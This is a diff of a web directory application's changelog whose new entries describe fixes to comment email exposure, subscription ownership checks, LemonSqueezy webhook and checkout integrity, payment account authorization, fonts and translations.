+- `apps/web/lib/db/queries/comment.queries.ts` `apps/web/app/api/items/[slug]/comments/{route.ts,[commentId]/route.ts}` `apps/web/lib/types/comment.ts` `apps/web/lib/db/queries/types.ts` `docs/api/comment-endpoints.md`: item comments exposed every commenter's email to anyone. `getCommentsByItemId` selected `clientProfiles.email` into `user`, `GET /api/items/{slug}/comments` needs no session, and the item page prefetches the same query into its HTML through `HydrationBoundary`, so the emails were in the API response and in view-source of `/items/{slug}`. `getCommentsByItemId`, `getCommentWithUserById` (the `POST` response) and the comment `PUT` response no longer select the email; `user.email` is gone from both `CommentWithUser` types (nothing in the UI read it) and from the Swagger blocks and examples of both routes. The admin comment routes keep their own queries. The API, engagement-query, type-system and voting-comments docs drop the field (the translated copies under `apps/docs/i18n` still show it in their examples and are not changed here). Source guard `lib/db/queries/__tests__/comment-public-fields.spec.ts` (5 of its 6 tests fail on the old code). T-2500 (#1128).
+
+- `apps/web/lib/payment/lemonsqueezy-list-access.ts` `apps/web/app/api/lemonsqueezy/list/route.ts` `docs/plugins/subscription-owner-email-verification-spec.md` `spec-060` (R5): `GET` and `POST /api/lemonsqueezy/list` matched purchases by the session email without checking it was verified, so someone who registered with another person's address first could read that person's LemonSqueezy checkouts (the four write routes were fixed in #1123). New `resolveListAccess` runs before LemonSqueezy is called: the caller's own email needs `isEmailVerifiedForOwnership` or the route answers 403 `EMAIL_NOT_VERIFIED`; an admin listing another customer's email (live role lookup) is not subject to their own email's verification, since the role cannot be obtained by registering an address. Swagger 403 added to both blocks. Unit spec `lib/payment/__tests__/lemonsqueezy-list-access.spec.ts`; wiring spec extended in `subscription-ownership-wiring.spec.ts`; the #1119 source guard in `lemonsqueezy-webhook.spec.ts` now checks the `isAdmin` hand-off and that LemonSqueezy is only asked for the decided email. T-2496 (#1126).
+
+- `spec-060` `apps/web/lib/payment/{lemonsqueezy-subscription-events,lemonsqueezy-verified-email-user}.ts` `apps/web/lib/services/webhook-subscription.service.ts` `apps/web/app/api/lemonsqueezy/webhook/route.ts`: two follow-ups of the webhook work. (1) A LemonSqueezy purchase made without our checkout route has no user id in its custom data; the shared service then found a user by email but still wrote `userId` from the metadata, so the row had no owner and the event was redelivered forever. For a plan variant (create, and an update that has to create the row) the LemonSqueezy handler now looks the user up by the customer email and puts the id in the metadata, only when the address is proven to be that user's (`isEmailVerifiedForOwnership`: `emailVerified`, or a linked OAuth/OIDC account for a user without a password); the shared service is unchanged, so a Stripe invoice that arrives before its subscription still cannot create a row from an email match. (2) A `subscription_payment_failed` for a subscription with no row (an unknown variant never writes one, and an invoice carries no variant to check) answered 503 and was retried until LemonSqueezy gave up; the handler now passes `createIfMissing: false` and the service acknowledges a missing row (logged), while a failed write on an existing row still answers 503. The other providers keep their behaviour. Unit spec `apps/web/lib/payment/__tests__/lemonsqueezy-webhook-followups.spec.ts` ([060](spec/060-lemonsqueezy-webhook-integrity/spec.md) R14–R15, T-2497).
+
+- `apps/web/hooks/use-comments.ts`, `apps/web/lib/types/comment-rating.ts`, `docs/hooks/{use-comments-reference,client-hooks,engagement-hooks}.md`, `docs/features/voting-comments{,-deep-dive}.md` and the 12 translated copies of the last two: `useComments().commentRating` is the object `{ averageRating, totalRatings }` that `GET /api/items/{slug}/comments/rating` answers with, but the hook defaulted it to the number `0` while loading and the docs called it a `number`. The query is now typed (`CommentRatingSummary`) and defaults to `EMPTY_COMMENT_RATING` (`{ averageRating: 0, totalRatings: 0 }`), so the value has one shape in every state; every doc lists that type. No reader of `commentRating` exists in `apps/web` today, so no caller changes. Guarded by `apps/web/lib/types/__tests__/comment-rating.spec.ts`. Translations edited by hand (type only; the generators were not run). The hook's contract is recorded in `docs/hooks/use-comments-reference.md` (updated here); this brings the declared type in line with what the route has always returned, so it is a bug fix to that contract, not a new feature (#1124).
+
+- `apps/web/lib/auth/connected-accounts.ts` (new), `apps/web/app/api/auth/security/connected-accounts/{route.ts,[provider]/route.ts}`, `apps/web/lib/payment/subscription-email-verification.ts`: the connected-accounts list and disconnect counted only `accounts.type = 'oauth'`, but Auth.js stores Google and other OpenID Connect providers as `oidc`, so those links were not listed in the settings card, and the last-sign-in-method guard did not count them (it refused a user whose other link was `oidc`; the delete itself already matched `oidc`). Both routes now use the shared `OAUTH_ACCOUNT_TYPES` set (`oauth` + `oidc`, also used by the verified-email lookup); the password row is still never listed or deletable. The guard (`canDisconnectProvider`) now asks whether a password or a link to ANOTHER provider remains, because the delete removes every row of the provider (two Google links no longer count as each other's fallback); it runs in a transaction under a lock on the user row, so two disconnects sent at once cannot both pass; and a legacy password row (`type: 'email'`, provider `credentials`) counts as a password, as in `two-factor.ts`. Both routes also match account rows with a NULL `tenant_id` (the Auth.js adapter links OAuth/OIDC accounts without a tenant, so an exact tenant match hid them; review fix); a password row counts only in the current tenant, because `verifyClientPassword` signs in with that row only. `linkAccount` in `lib/auth/index.ts` now also records the tenant on new links, so only rows linked before this change keep a NULL tenant. Tests in `lib/auth/__tests__/connected-accounts.spec.ts`; rule noted in `docs/plugins/subscription-owner-email-verification-spec.md`. T-2494.
+
+- `spec-060` `apps/web/lib/payment/{lemonsqueezy-webhook,lemonsqueezy-list-access}.ts` `apps/web/lib/payment/lib/providers/lemonsqueezy-provider.ts` `apps/web/lib/services/webhook-subscription.service.ts` `apps/web/app/api/lemonsqueezy/{webhook,list}/route.ts`: the LemonSqueezy webhook rejected every genuine event (`verification_failed`) because the route handed the body text to the provider as the payload and the HMAC was computed over `JSON.stringify` of it; it now reads the raw body once, verifies `X-Signature` over those bytes with a constant-time compare (an empty secret never verifies) and parses the same text. Events are mapped from LemonSqueezy's fields (subscription, customer and user id, status, `renews_at`/`ends_at`) and stored under provider `lemonsqueezy` (the service was built with the Stripe default); a redelivered event is acknowledged once per pod. The service now converts period-end timestamps to dates on create/update (a Stripe-shaped number was written to a date column), keeps the stored end date when a payment event has none, and passes the original payload when an update falls back to creating the row. `GET /api/lemonsqueezy/list` always uses the session email and answers 403 for another customer's `customerEmail` unless the caller is an admin (POST already did). Review fixes: a failed handler no longer marks the event as done (the route answers 503 so it is redelivered); a cancelled subscription keeps access until `ends_at` and writes `auto_renewal = false` (the table's check rejects `cancel_at_period_end` with auto-renewal, which made the cancellation fail to save); amounts are rounded to whole major units before the integer columns (`stored-amount.ts`); an unknown period end on create is stored as none instead of "now"; the adapter has an explicit output type (`SubscriptionServiceInput`) that `handleSubscriptionTrialEnding` now accepts, which fixes the type error without a cast; sponsor-ad subscriptions no longer reach the plan service on update or payment failure (that created a Standard plan row per sponsor-ad purchase) and their first invoice is not counted as a renewal; the list route checks admin with a live role lookup instead of the JWT claim. Second review fix: the plan came from `custom_data.planId`, which the buyer controls (the checkout route spread client `metadata` into the custom data and forwarded a client `customPrice`), so paying for the cheap variant could grant Premium; the plan now comes from the event's `variant_id` through a server-side catalog built from the pricing page's own variant configuration (`lib/payment/lemonsqueezy-variant-{plan,catalog}.ts`), an unknown variant writes no row and is acknowledged, and updates on non-plan variants and invoices only update an existing row (`createIfMissing: false` on the subscription service). Sponsor ads are activated only by a sponsor-ad variant matching the ad's interval and later acted on only when the ad is bound to the same subscription (`lib/payment/lemonsqueezy-subscription-events.ts`). `POST /api/lemonsqueezy/checkout` takes only `variantId` and `dark` and sets the custom data from the session (`lemonsqueezy-checkout-params.ts`); GET forwards only `email` and `variantId`. Open point Q-060b. Third review fix: `POST /api/lemonsqueezy/update-plan` and `/update` only move a subscription to a configured plan variant (R12), since the webhook keeps the stored plan for any other variant; sponsor-ad events for an ad already past that state are acknowledged instead of retried, and a confirmation that writes nothing is retried; invoice events store the invoice id. Unit specs `apps/web/lib/payment/__tests__/lemonsqueezy-{webhook,plan-integrity,checkout-wiring}.spec.ts` ([060](spec/060-lemonsqueezy-webhook-integrity/spec.md), #1119).
+
+- `apps/web/app/api/payment/account/route.ts`, `apps/web/lib/payment/lib/client/payment-account-client.ts` (deleted), `docs/plugins/payment-account-method-spec.md`, `docs/guides/how-to-add-a-payment-provider.md`, `docs/payment/{payment,solidgate}.md` (+ `apps/docs/i18n` copies), `docs/api/payment-endpoints.md`: after #1115 a signed-in user could still `POST`/`PUT /api/payment/account` for their own `userId` with any provider customer id, which the Stripe billing portal, the invoice list and the Polar ownership check trust. Both methods are now admin-only (`requireAdminSession`: 401 anonymous, 403 non-admin, before the body is read); the ownership check is gone because an admin writes for other users. `GET /api/payment/account/[userId]` is unchanged. The unused `apps/web/lib/payment/lib/client/payment-account-client.ts` (`paymentAccountClient`) is deleted, since nothing imported it (the providers use `@/lib/db/queries`), and the docs no longer present it as current (the `apps/docs/i18n` copies of `payment/{payment,solidgate}.md` included; their solidgate lookup lists now render as lists); the only remaining mention is the deletion note in `docs/plugins/payment-account-method-spec.md`. The `PUT` OpenAPI text now says the row is matched by `userId` + provider, not by `id`. The method spec has read-only audit queries for `paymentAccounts` rows that may predate the fix (the unique `(customerId, providerId)` index already blocks one customer id under two users of a provider). The pre-#1115 text in the method spec is now under a "History" heading. Unit spec `apps/web/lib/payment/__tests__/payment-account-auth.spec.ts`; e2e spec comment updated. (#1122)
+
+- `apps/web/app/api/payment/account/route.ts`, `apps/web/lib/payment/lib/client/payment-account-client.ts` (deleted), `docs/plugins/payment-account-method-spec.md`, `docs/guides/how-to-add-a-payment-provider.md`, `docs/payment/{payment,solidgate}.md` (+ `apps/docs/i18n` copies), `docs/api/payment-endpoints.md`: after #1115 a signed-in user could still `POST`/`PUT /api/payment/account` for their own `userId` with any provider customer id, which the Stripe billing portal, the invoice list and the Polar ownership check trust. Both methods are now admin-only (`requireAdminSession`: 401 anonymous, 403 non-admin, before the body is read); the ownership check is gone because an admin writes for other users. `GET /api/payment/account/[userId]` is unchanged. The unused `apps/web/lib/payment/lib/client/payment-account-client.ts` (`paymentAccountClient`) is deleted, since nothing imported it (the providers use `@/lib/db/queries`), and the docs no longer present it as current (the `apps/docs/i18n` copies of `payment/{payment,solidgate}.md` included; their solidgate lookup lists now render as lists); the only remaining mention is the deletion note in `docs/plugins/payment-account-method-spec.md`. The `PUT` OpenAPI text now says the row is matched by `userId` + provider, not by `id`. The method spec has read-only audit queries for `paymentAccounts` rows that may predate the fix (the unique `(customerId, providerId)` index already blocks one customer id under two users of a provider). The pre-#1115 text in the method spec is now under a "History" heading. Unit spec `apps/web/lib/payment/__tests__/payment-account-auth.spec.ts`; e2e spec comment updated. (#1122)
+- `apps/web/lib/payment/subscription-ownership.ts`, `apps/web/lib/payment/subscription-email-verification.ts`, `apps/web/app/api/lemonsqueezy/{cancel,reactivate,update-plan,update}`: the LemonSqueezy owner check compares the customer email with `session.user.email`, and credentials sign-up does not verify the email, so someone who registered first with another person's address could cancel or change that person's subscription. The four routes now call `isEmailVerifiedForOwnership` (true when the session email equals the stored `users.email` and either `users.emailVerified` is set or the user has a linked `oauth`/`oidc` account not bound to another address; `updateUser` in `user.queries.ts` now clears `emailVerified` and binds the OAuth rows when the address changes, so a verification cannot move to another person's address) and answer 403 `EMAIL_NOT_VERIFIED` before the owner lookup and before any LemonSqueezy call; non-owners still get 404 and sign-in is unchanged. Contract in `docs/plugins/subscription-owner-email-verification-spec.md`; unit and wiring tests extended in `lib/payment/__tests__/subscription-ownership{,-wiring}.spec.ts`. An OAuth link proves the address only for a user without a password, and the connected-accounts DELETE removes only OAuth rows (review fix). T-2491 (#1123).
+
+- `apps/docs/i18n/*/docusaurus-plugin-content-docs-template/current/features/voting-comments.md` `voting-comments-deep-dive.md` (all 12 locales): removed `rateComment`, `updateCommentRating`, `isRatingComment` and `isUpdatingRating` from the `useComments` listings and the POST/PUT `/api/items/:id/comments/rating` rows, which never existed (only `GET` does; the route-tree comment now says "GET rating endpoint"). In `ar` and `zh`, where the translation step had replaced inline code with numbers and broken the tables and bullets, both pages are rewritten from the English structure (tables, data-model bullets, `useAdminComments`, `DATABASE_URL`, `aria-busy`, ...) with English HTTP verbs. Hand-edited: the generators in `apps/docs/scripts/` call an external translation API and were not run. The other translated pages that still list the removed names (`api/*`, `database/*`) are left for a follow-up.
+
+- `apps/web/hooks/use-comments.ts`, `docs/hooks/use-comments-reference.md`, `docs/hooks/client-hooks.md`, `docs/hooks/engagement-hooks.md`, `docs/features/voting-comments.md`, `docs/features/voting-comments-deep-dive.md`: removed `rateComment` / `isRatingComment` (POST) and `updateCommentRating` / `isUpdatingRating` (PUT) from `useComments`. Both called `/api/items/{slug}/comments/rating`, which only exports GET, so they always got 405, and nothing used them (`comments-section.tsx` only uses comments, create, update and delete). A rating changes through `updateComment({ commentId, rating })`, which calls `PUT /api/items/{slug}/comments/{commentId}` (author only). `PATCH /api/items/{slug}/comments/rating/{commentId}` also sets a rating (author only since #1116). The hook's `commentRating` / `isLoadingRating` (GET) are unchanged. The POST/PUT `/comments/rating` rows were also dropped from the endpoint tables in `docs/features/voting-comments.md`, `docs/features/voting-comments-deep-dive.md` and `docs/api/client-endpoints.md`, and the reference page says a 401 opens the login modal only for create and update. Translated copies under `apps/docs/i18n` still list the removed names and need a regeneration. Create, update and delete now also refresh `["commentRating", itemId]` (and delete refreshes `["item-rating", itemId]`), so the aggregate follows a rating change. The hook contract is recorded in `docs/hooks/use-comments-reference.md`; the removed members never worked (405), so no feature spec (constitution Art. VIII) (#1120).
+
+- `apps/web/lib/payment/subscription-ownership.ts`, `apps/web/app/api/lemonsqueezy/{cancel,reactivate,update-plan,update}`, `apps/web/app/api/stripe/subscription/route.ts` (PUT, DELETE), `apps/web/app/api/stripe/subscription/[subscriptionId]/{cancel,reactivate}`: any signed-in user could cancel, reactivate or change the plan of another customer's subscription by sending its id. Every one of these handlers now checks the owner and answers 404 before it changes anything at the provider or writes a row (the LemonSqueezy check itself reads the subscription from LemonSqueezy). Stripe routes load the row by `('stripe', id)` and compare `userId`, so a row a user inserts under another provider name with the same id (`POST /api/stripe/subscriptions` accepts any provider and id) is no proof of ownership. LemonSqueezy routes ask LemonSqueezy for the subscription and compare its customer email with the signed-in email, the identity `GET /api/lemonsqueezy/list` already uses, because the LemonSqueezy webhook never writes owner rows. Source guard `lib/payment/__tests__/subscription-ownership-wiring.spec.ts` fails when a route that cancels or updates a subscription has no check, or when a route listed as checking ownership its own way loses that check. T-2467, PR #1114.
+
+- `apps/web/app/api/items/[slug]/comments/rating/[commentId]/route.ts`, `apps/web/lib/db/queries/comment.queries.ts`: `PATCH` on a comment's rating only checked that the caller was signed in, and comment ids are public, so any signed-in user could change another user's star rating (and with it the item's average rating, stats card and Product JSON-LD `aggregateRating`). `updateCommentRating` is replaced by `updateCommentRatingForOwner(id, clientProfileId, rating)`, whose `WHERE` also matches the author and skips soft-deleted comments. The route now needs `session.user.id`, returns 404 when the caller has no client profile or is not the author, and only accepts an integer rating from 1 to 5. Guarded by `apps/web/lib/db/queries/__tests__/comment-rating-owner.spec.ts`. The route contract is in `docs/plugins/item-comments-rating-id-update-method-spec.md` (new "Current contract" section; its "no auth gate" text was stale). (#1116)
+
+- `apps/web/app/api/stripe/subscriptions/route.ts`, `apps/web/lib/db/queries/subscription.queries.ts`, `apps/web/lib/payment/subscription-identity.ts`, `apps/web/app/api/stripe/subscription/[subscriptionId]/{cancel,reactivate}/route.ts`: any signed-in user could `POST /api/stripe/subscriptions` with any `paymentProvider` and provider `subscriptionId` (for example a LemonSqueezy customer's numeric id); that row passed the owner check in `PATCH /api/payment/[subscriptionId]`, which then cancelled the real subscription at the provider. `POST` is now admin-only (`requireAdminSession`, live DB role check; 401 / 403 otherwise); nothing in the app calls it, so it is gated, not removed. `PUT` on the same route is admin-only too, with the same 401 / 403 split: the owner could set `planId`, `status` and `endDate` on their own row, and `getUserPlan` reads those fields, so any user with a row could grant themselves a paid plan; nothing in the app calls `PUT` either. `PUT` also no longer rewrites `userId`, `paymentProvider`, `subscriptionId`, `customerId`, `tenantId`, `id` or `createdAt` (same forgery by another door). `updateSubscriptionBySubscriptionId` now requires and matches `paymentProvider` as well as the id (it used to update rows of every provider sharing that id); the Stripe cancel and reactivate routes pass `'stripe'`. `PATCH /api/payment/[subscriptionId]` already looked the row up by provider + id and compared `userId` with the session user before any provider call, so it is unchanged. The route contract is in `docs/plugins/stripe-subscriptions-method-spec.md` (new "Current contract" section). Unit spec `apps/web/lib/payment/__tests__/subscription-forgery.spec.ts`. (#1118)
+
+- `spec-059` `apps/web/lib/seo/schema.ts` `apps/web/app/[locale]/collections/[slug]/page.tsx`: a collection page's `CollectionPage` JSON-LD now lists its items as `ItemList.itemListElement` (1-based position, name, localized item URL; blank entries dropped, capped at 50, `numberOfItems` keeps the true count); before it carried only the count. Unit spec `apps/web/lib/seo/__tests__/collection-schema-items.spec.ts` ([059](spec/059-collection-item-list/spec.md), #1117). Review fixes: positions follow the name-ascending order the grid opens with (same `sortItems` call as `CollectionDetail`'s default) instead of the content loader's featured/newest-first order, and `numberOfItems` without an explicit count reports every valid item rather than the capped 50. A non-string `name` from item YAML no longer throws (a number is listed as text, anything else is dropped), and a repeated URL is listed once.
+
+- `spec-059` `apps/web/lib/seo/schema.ts` `apps/web/app/[locale]/collections/[slug]/page.tsx`: a collection page's `CollectionPage` JSON-LD now lists its items as `ItemList.itemListElement` (1-based position, name, localized item URL; blank entries dropped, capped at 50, `numberOfItems` keeps the true count); before it carried only the count. Unit spec `apps/web/lib/seo/__tests__/collection-schema-items.spec.ts` ([059](spec/059-collection-item-list/spec.md), #1117). Review fixes: positions follow the name-ascending order the grid opens with (same `sortItems` call as `CollectionDetail`'s default) instead of the content loader's featured/newest-first order, and `numberOfItems` without an explicit count reports every valid item rather than the capped 50. A non-string `name` from item YAML no longer throws (a number is listed as text, anything else is dropped), and a repeated URL is listed once.
+- `apps/web/app/api/payment/account/route.ts`, `apps/web/lib/payment/lib/providers/*-provider.ts`, `apps/web/lib/payment/config/payment-provider-manager.ts`: POST and PUT `/api/payment/account` never checked the session, so anyone could overwrite any user's provider customer id. Both now return 401 without a session, 403 when `session.user.id` differs from `userId`, and 400 for provider names outside `PaymentProvider`. The four providers read and write payment accounts through `@/lib/db/queries` instead of calling the route over HTTP without a cookie, and `payment-provider-manager` imports each provider from its own file so the database code stays out of the browser bundle. `apps/web-e2e/tests/api/payment-account-method.spec.ts` now expects the 401 (#1115).
+
+## 2026-11-15
+
+- `apps/web/tailwind.config.ts`, `apps/web/app/[locale]/globals.scss`, `apps/web/app/layout.tsx`: Geist Mono was loaded and preloaded in `app/layout.tsx` but nothing used it, because `font-mono` fell back to Tailwind's default stack and the only rule naming `--font-geist-mono` sat in `globals.css`, which no file imports. `font-mono` now maps to `var(--font-geist-mono), ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace`, and the base layer gives `code, kbd, pre, samp` the same stack. The app has about 50 real monospace uses (help pages, billing/security settings, admin id/slug cells, promo codes, MDX `prose-code`), so the preload stays. The base-layer rule writes `var(--font-geist-mono, ui-monospace)` so it stays valid where the variable is not set (`app/global-error.tsx` renders its own `<body>`); without the fallback its `<pre>` drew the stack trace in the sans font. `Geist_Mono` now uses `adjustFontFallback: false`: next/font's `Geist Mono Fallback` face is Arial scaled to 134.59%, and it drew Arabic and Hebrew letters in code (Geist Mono has none) about a third larger than the code around them, and Latin code before Geist Mono loaded. Consolas/Menlo/Courier New from the CSS stack take over instead, as before. Trivial-fix exception (no spec). (#1113)
+- `apps/web/app/[locale]/globals.scss`: the base `body` rule set `font-family: sans-serif`, so page text used the system font and the Geist download (loaded in `app/layout.tsx`) was never used. `body` now uses `var(--font-geist-sans)` followed by the system stack already used in `globals.css`, and the `body.font-locale-*` overrides put their Noto font first and keep Geist behind it. Arabic and Hebrew pages (`:where(html:lang(ar), html:lang(he)) body`) use the system stack without Geist: next/font's Arial-based `Geist Fallback` face would otherwise draw Arabic and Hebrew letters on Windows instead of the system UI font. Trivial-fix exception (no spec). Note: `getFontClassNames` in `app/fonts.ts` is not called anywhere, so the `font-locale-*` classes and `--font-noto-*` variables are not applied to `<body>` yet; that is a separate follow-up (#1112).
+- `apps/web/components/scroll-to-top-button.tsx`: the button's accessible name ("Scroll to top") and hover hint ("Back to top") were hard-coded English; they now come from the `header.SCROLL_TO_TOP` / `header.BACK_TO_TOP` keys in all 21 `apps/web/messages/*.json` files. The `group` class also moved from the button to its wrapper so the hint now appears on hover and keyboard focus (it was a sibling and never showed), and the hint is `aria-hidden` so screen readers do not hear it after the button's name. Trivial-fix exception (no spec). Unit spec `apps/web/lib/__tests__/scroll-to-top-button.spec.ts` (#1110).
+- `apps/web/components/scroll-to-top-button.tsx`: the "Back to top" hint was centred on the button, which sits 32 px from the right edge, so longer translations (nl, ar, id, fr) ran past the right edge of the viewport. The hint is now anchored to the button's right edge (`right-0`; the button is `fixed right-8` in RTL too, so this holds for `ar` and `he`) and grows into the page. The arrow keeps pointing at the button's centre with a per-size offset. Trivial-fix exception (no spec). Unit spec `apps/web/lib/__tests__/scroll-to-top-button.spec.ts` (#1111).
+
 ## 2026-11-13
 
+- `spec-055`: shipped. T-006 live check done after the stage → main release (#1106): demo.ever.works shows the demo account strip linking to app.ever.works/register; timetrack.ever.works (a customer directory, runtime `demo=false`) shows none ([055](spec/055-demo-banner/spec.md)).
 - `spec-054` `spec-056` `spec-057` `apps/web/scripts/{clone,site-git-token}.cjs` `apps/web/lib/git/site-git-token.ts` `apps/web/lib/seo/aggregate-rating.ts` `apps/web/app/[locale]/items/[slug]/page.tsx` `apps/web/components/item-detail/item-detail.tsx` `apps/web/lib/repositories/{tag,collection}.repository.ts`: review fixes from the stage → main release (#1106). The build-time clone handed the data-repo token to any `DATA_REPOSITORY` (plain `http://`, another host); it now hands it only to `https://github.com`, through the same `isGitHubRemote` rule as the runtime callbacks, and both now also refuse a URL with credentials of its own, a port other than 443, or a URL whose text does not start with `https://github.com` (optionally `:443`) followed by `/` or nothing (a percent-encoded host such as `github%2Ecom`). The item page's `aggregateRating` now follows the ratings flag: none when `getFeatureFlags().ratings` is off, and none in a browser whose flags turn ratings off (database simulation `disabled`), like the rating badge. The tag and collection "token not configured" errors name the broker variables. Docs: spec 056 R0/R5 and the plan now say values are trimmed and out-of-range whole numbers are clamped, and the follow-ups drop the admin lists that already answer 400; spec/plan 054 say the token goes only to `https://github.com` with or without the broker, what a BuildKit cache hit reuses, and that a Vercel deploy without `GH_TOKEN` keeps the project's value (the 2026-11-08 line below is corrected). Unit specs `apps/web/scripts/site-git-token.spec.ts`, `apps/web/lib/git/__tests__/{site-git-token,site-git-credentials-message}.spec.ts`, `apps/web/lib/seo/__tests__/{product-schema-rating,item-rating-wiring}.spec.ts` ([054](spec/054-per-site-git-token/spec.md), [056](spec/056-pagination-params/spec.md), [057](spec/057-item-aggregate-rating/spec.md), #1107).
 - `spec-058` `apps/web/lib/utils/source-url.ts` `apps/web/lib/repositories/client-item.repository.ts` `apps/web/app/api/client/items/route.ts`: `POST /api/client/items` now answers 409 when a pending or approved item already uses the submitted link (scheme, `www.`, trailing slash, fragment and tracking parameters ignored); rejected, draft and deleted items do not block. Unit specs `apps/web/lib/utils/__tests__/{source-url,mutex,duplicate-submission-wiring}.spec.ts` ([058](spec/058-duplicate-submission-guard/spec.md), #1105).
 
@@ -218,7 +306,7 @@ why** at a higher level than per-commit diffs.
 - Backwards-compatible: when `K8S_EXTRA_HOSTS` is empty / unset the
   rendered Ingress is byte-identical to pre-EW-741 output.
 
-## 2026-06-17 — Feat: instant sparkline bump + flicker-free rollback on upvote
+### Feat: instant sparkline bump + flicker-free rollback on upvote
 
 - spec-037: the item-detail Statistics card already tracked total votes
   optimistically via `useItemVote`'s `setQueryData(['item-votes', …])`, but
@@ -259,7 +347,7 @@ why** at a higher level than per-commit diffs.
 
 ---
 
-## 2026-06-16 — Feat: k8s deploy provisions Work runtime env
+### Feat: k8s deploy provisions Work runtime env
 
 - spec-040: k8s-deployed directory sites 500 at first render (`[auth] AUTH_SECRET must be set in production`) because the Deployment only carried NODE_ENV/PORT/HOSTNAME. Added a `deploy_k8s.yaml` step that materializes a `${WORK_SLUG}-runtime-env` Secret from the AUTH_SECRET/COOKIE_SECRET/COOKIE_SECURE/DATABASE_URL secrets the platform pushes (+ NEXT_PUBLIC_APP_URL/COOKIE_DOMAIN from the ingress host), and `deployment.yaml` mounts it via `envFrom` (optional). Platform half: ever-works DeployService.ensureRuntimeEnv + WorkRuntimeEnvService. See `docs/spec/040-k8s-deploy-runtime-env/spec.md`. (PR: pending)
 
@@ -310,7 +398,7 @@ why** at a higher level than per-commit diffs.
 
 ---
 
-## 2026-05-27 — Fix: Edge Runtime build break in activity-feed push client
+### Fix: Edge Runtime build break in activity-feed push client
 
 - spec-024: replaced the `import { randomUUID } from 'node:crypto'` at the top of
   `apps/web/lib/services/platform-activity-feed/push-client.ts` with
@@ -378,7 +466,7 @@ submit form` Playwright test (button never appeared, hence
     - orphan modal state); Modify Plan → `/pricing`; View Details → details
       disclosure; Contact Support → `mailto:`. No new API routes.
 
-## 2026-05-26 — Spec 034: Client Billing page UI consistency
+### Spec 034: Client Billing page UI consistency
 
 - spec-034: drafted `docs/spec/034-client-billing-ui-consistency/spec.md` and
   shipped the implementation in the same PR (EW-649). UI-only realignment of
@@ -430,7 +518,7 @@ submit form` Playwright test (button never appeared, hence
       the bar can still reach 100%. The step is now marked complete only when all
       applicable tracked fields are filled.
 
-## 2026-05-24 — /submit: hide pricing-only promo sections in payment step
+### /submit: hide pricing-only promo sections in payment step
 
 - `apps/web/components/pricing/pricing-section.tsx`: gated the "Sponsor Ads"
   promo block, the "Enhanced Continue Section" (its own continue-to-/submit
@@ -441,7 +529,7 @@ submit form` Playwright test (button never appeared, hence
   header; the submit flow has its own form navigation, so the continue CTA was
   redundant there.
 
-## 2026-05-24 — i18n: translate remaining hard-coded strings on /submit
+### i18n: translate remaining hard-coded strings on /submit
 
 - `apps/web/components/submit/submit-form-client.tsx`,
   `apps/web/components/directory/details-form/steps/basic-info-step.tsx`,
@@ -458,7 +546,7 @@ submit form` Playwright test (button never appeared, hence
   `TOAST_INVALID_URL/SUBMIT_SUCCESS/SUBMIT_FAILED/SUBMIT_ERROR`) across all 21
   locale files. No behaviour change.
 
-## 2026-05-24 — Fix: /submit drops location and extra categories
+### Fix: /submit drops location and extra categories
 
 - `apps/web/components/submit/submit-form-client.tsx`: the submit handler built
   its API payload from the singular `category` field (first selected id only)
@@ -591,7 +679,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 16: stacked locale + BOM/control + manifest shape (develop-only)
+### Spec 028 round 16: stacked locale + BOM/control + manifest shape (develop-only)
 
 Round 16 of the rolling e2e coverage buildout. 10 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -629,7 +717,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 15: URL malforms + theme/submissions trash + webhook edges (develop-only)
+### Spec 028 round 15: URL malforms + theme/submissions trash + webhook edges (develop-only)
 
 Round 15 of the rolling e2e coverage buildout. 10 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -661,7 +749,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 14: locale × RSC + perf/CLS + admin CRUD deeper (develop-only)
+### Spec 028 round 14: locale × RSC + perf/CLS + admin CRUD deeper (develop-only)
 
 Round 14 of the rolling e2e coverage buildout. 14 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -694,7 +782,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 13: sitemap variants + HTML hygiene + admin CORS (develop-only)
+### Spec 028 round 13: sitemap variants + HTML hygiene + admin CORS (develop-only)
 
 Round 13 of the rolling e2e coverage buildout. 13 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -729,7 +817,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 12: a11y deeper + HTML sanity (develop-only)
+### Spec 028 round 12: a11y deeper + HTML sanity (develop-only)
 
 Round 12 of the rolling e2e coverage buildout. 16 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -764,7 +852,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 11: locale prefix sweep + cookie/header hygiene (develop-only)
+### Spec 028 round 11: locale prefix sweep + cookie/header hygiene (develop-only)
 
 Round 11 of the rolling e2e coverage buildout. 17 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -803,7 +891,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 10: tracking params, scanner probes, conditional reqs, viewport (develop-only)
+### Spec 028 round 10: tracking params, scanner probes, conditional reqs, viewport (develop-only)
 
 Round 10 of the rolling e2e coverage buildout. 23 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -854,7 +942,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 9: perf budgets, console hygiene, navigation flood (develop-only)
+### Spec 028 round 9: perf budgets, console hygiene, navigation flood (develop-only)
 
 Round 9 of the rolling e2e coverage buildout. 26 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -908,7 +996,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 8: csrf wire, sitemap shape, RSC sweep, admin verb flood (develop-only)
+### Spec 028 round 8: csrf wire, sitemap shape, RSC sweep, admin verb flood (develop-only)
 
 Round 8 of the rolling e2e coverage buildout. 29 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -968,7 +1056,7 @@ cascade to `stage` / `main` per operator instructions.
